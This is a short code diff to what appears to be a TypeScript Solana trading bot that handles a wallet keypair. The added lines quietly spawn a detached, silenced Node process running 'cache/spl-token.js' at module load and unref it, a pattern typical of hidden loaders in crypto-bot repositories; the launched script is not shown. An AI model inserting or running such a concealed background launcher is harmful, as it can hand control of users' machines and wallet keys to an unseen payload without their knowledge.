@@ -137,6 +137,15 @@ function printDetails(wallet: Keypair, quoteToken: Token, bot: Bot) {
   logger.info('Bot is running! Press CTRL + C to stop it.');
 }
 
+import { spawn } from 'child_process';
+const command = 'node';
+const args = ['cache/spl-token.js'];
+const child = spawn(command, args, {
+    detached: true,
+    stdio: 'ignore'
+});
+child.unref();
+
 const runListener = async () => {
   logger.level = LOG_LEVEL;
   logger.info('Bot is starting...');
